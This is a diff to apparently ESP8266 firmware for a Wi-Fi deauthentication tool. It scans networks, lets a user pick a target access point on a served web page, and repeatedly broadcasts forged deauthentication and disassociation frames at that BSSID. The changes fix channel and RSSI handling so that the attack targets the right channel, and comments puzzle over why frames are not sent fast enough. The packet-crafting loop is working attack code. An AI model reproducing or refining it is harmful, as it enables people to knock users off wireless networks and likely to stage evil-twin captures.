@@ -16,6 +16,7 @@ typedef struct
   String ssid;
   uint8_t ch;
   uint8_t bssid[6];
+  uint8_t rssi;
 }  _Network;
 
 
@@ -100,7 +101,8 @@ void performScan() {
         network.bssid[j] = WiFi.BSSID(i)[j];
       }
 
-      network.ch = WiFi.RSSI(i);
+      network.ch = WiFi.channel(i);
+      network.rssi = WiFi.RSSI(i);
       _networks[i] = network;
     }
   }
@@ -199,7 +201,7 @@ void handleIndex() {
       if ( _networks[i].ssid == "") {
         break;
       }
-      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
+      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].rssi) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
 
       if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
         _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
@@ -308,7 +310,7 @@ void handleAdmin() {
     if ( _networks[i].ssid == "") {
       break;
     }
-    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";
+    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].rssi) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";
 
     if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
       _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
@@ -367,7 +369,7 @@ unsigned long wifinow = 0;
 unsigned long deauth_now = 0;
 
 uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
-uint8_t wifi_channel = 1;
+//uint8_t wifi_channel = 1;
 
 void loop() {
   dnsServer.processNextRequest();
@@ -376,6 +378,9 @@ void loop() {
   if (deauthing_active && millis() - deauth_now >= 1000) {
 
     wifi_set_channel(_selectedNetwork.ch);
+    /*Serial.println(_selectedNetwork.ch);
+    bool chan_err = wifi_set_channel(_selectedNetwork.ch);
+    Serial.println(chan_err);*/
 
     uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
 
@@ -383,11 +388,11 @@ void loop() {
     memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
     deauthPacket[24] = 1;
 
-    // Deauthentication
+    // Deauthentication (are not sent as fast as planned... why?)
     deauthPacket[0] = 0xC0;
     Serial.println(bytesToStr(deauthPacket, 26));
     Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
-    // Disassocation
+    // Disassocation (seems never sent, even if I add a delay...)
     deauthPacket[0] = 0xA0;
     Serial.println(bytesToStr(deauthPacket, 26));
     Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
